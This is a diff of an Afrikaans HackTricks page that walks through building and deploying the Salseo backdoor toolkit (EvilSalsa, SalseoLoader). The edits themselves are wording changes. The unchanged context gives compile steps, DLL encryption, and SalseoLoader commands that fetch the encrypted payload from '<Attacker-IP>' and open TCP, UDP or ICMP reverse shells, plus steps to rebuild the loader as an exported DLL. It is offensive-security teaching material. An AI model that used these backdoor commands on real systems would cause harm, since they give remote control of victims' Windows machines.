@@ -10,16 +10,16 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 * Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
 * **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
 ## Samevoeging van die binêre
 
-Laai die bronkode van die github af en saam te stel **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode saam te stel.
+Laai die bronkode van die github af en saamvoeg **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode saam te voeg.
 
-Stel daardie projekte saam vir die argitektuur van die Windows-boks waar jy dit gaan gebruik (As die Windows x64 ondersteun, stel dit saam vir daardie argitektuur).
+Saamvoeg daardie projekte vir die argitektuur van die windows box waar jy dit gaan gebruik (As die Windows x64 ondersteun, saamvoeg dit vir daardie argitektuur).
 
 Jy kan **die argitektuur kies** binne Visual Studio in die **linker "Build" Tab** in **"Platform Target".**
 
@@ -33,7 +33,7 @@ Dan, bou albei projekte (Build -> Build Solution) (Binne die logs sal die pad va
 
 ## Berei die Backdoor voor
 
-Eerstens, jy sal die **EvilSalsa.dll** moet kodeer. Om dit te doen, kan jy die python skrip **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** saamstel:
+Eerstens, jy sal die **EvilSalsa.dll** moet kodeer. Om dit te doen, kan jy die python skrip **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** saamvoeg:
 
 ### **Python**
 ```
@@ -53,11 +53,11 @@ Ok, nou het jy alles wat jy nodig het om al die Salseo goed te uitvoer: die **ge
 
 ### **Kry 'n TCP reverse shell (aflaai van die gecodeerde dll deur HTTP)**
 
-Onthou om 'n nc as die reverse shell luisteraar te begin en 'n HTTP bediener op te stel om die gecodeerde evilsalsa te bedien.
+Onthou om 'n nc as die reverse shell luisteraar en 'n HTTP bediener te begin om die gecodeerde evilsalsa te bedien.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Kry 'n UDP omgekeerde skulp (aflaai van kodering dll deur SMB)**
+### **Om 'n UDP omgekeerde skulp te kry (gedownloade kodering dll deur SMB)**
 
 Onthou om 'n nc as die omgekeerde skulp luisteraar te begin, en 'n SMB-bediener om die gekodeerde evilsalsa (impacket-smbserver) te bedien.
 ```
@@ -82,21 +82,21 @@ python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## Samevoeging van SalseoLoader as DLL wat hoof funksie uitvoer
+## Samevoeging van SalseoLoader as DLL wat hooffunksie uitvoer
 
-Open die SalseoLoader projek met Visual Studio.
+Maak die SalseoLoader-projek oop met Visual Studio.
 
-### Voeg voor die hoof funksie by: \[DllExport]
+### Voeg voor die hooffunksie by: \[DllExport]
 
 ![](<../.gitbook/assets/image (409).png>)
 
 ### Installeer DllExport vir hierdie projek
 
-#### **Gereedskap** --> **NuGet Pakketbestuurder** --> **Bestuur NuGet Pakkette vir Oplossing...**
+#### **Gereedskap** --> **NuGet-pakketbestuurder** --> **Bestuur NuGet-pakkette vir Oplossing...**
 
 ![](<../.gitbook/assets/image (881).png>)
 
-#### **Soek vir DllExport pakket (met die Blader tab), en druk Installeer (en aanvaar die pop-up)**
+#### **Soek vir DllExport-pakket (met die Bladsy-blad), en druk Installeer (en aanvaar die pop-up)**
 
 ![](<../.gitbook/assets/image (100).png>)
 
@@ -112,13 +112,13 @@ Druk **Uninstall** (ja, dit is vreemd maar glo my, dit is nodig)
 
 Net **verlaat** Visual Studio
 
-Gaan dan na jou **SalseoLoader gids** en **voer DllExport\_Configure.bat** uit
+Gaan dan na jou **SalseoLoader-gids** en **voer DllExport\_Configure.bat** uit
 
-Kies **x64** (as jy dit binne 'n x64 boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Namespace vir DllExport**) en druk **Toepas**
+Kies **x64** (as jy dit binne 'n x64-boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Namespace vir DllExport**) en druk **Toepas**
 
 ![](<../.gitbook/assets/image (882).png>)
 
-### **Open die projek weer met Visual Studio**
+### **Maak die projek weer oop met Visual Studio**
 
 **\[DllExport]** moet nie langer as 'n fout gemerk wees nie
 
@@ -126,15 +126,15 @@ Kies **x64** (as jy dit binne 'n x64 boks gaan gebruik, dit was my geval), kies 
 
 ### Bou die oplossing
 
-Kies **Uitset tipe = Klas Biblioteek** (Projek --> SalseoLoader Eienskappe --> Aansoek --> Uitset tipe = Klas Biblioteek)
+Kies **Uitsettipe = Klasbiblioteek** (Projek --> SalseoLoader Eienskappe --> Aansoek --> Uitsettipe = Klasbiblioteek)
 
 ![](<../.gitbook/assets/image (847).png>)
 
-Kies **x64** **platform** (Projek --> SalseoLoader Eienskappe --> Bou --> Platform teiken = x64)
+Kies **x64** **platform** (Projek --> SalseoLoader Eienskappe --> Bou --> Platform-teiken = x64)
 
 ![](<../.gitbook/assets/image (285).png>)
 
-Om die oplossing te **bou**: Bou --> Bou Oplossing (Binne die Uitset konsole sal die pad van die nuwe DLL verskyn)
+Om die oplossing te **bou**: Bou --> Bou Oplossing (Binne die Uitset-konsol sal die pad van die nuwe DLL verskyn)
 
 ### Toets die gegenereerde Dll
 
@@ -176,8 +176,8 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
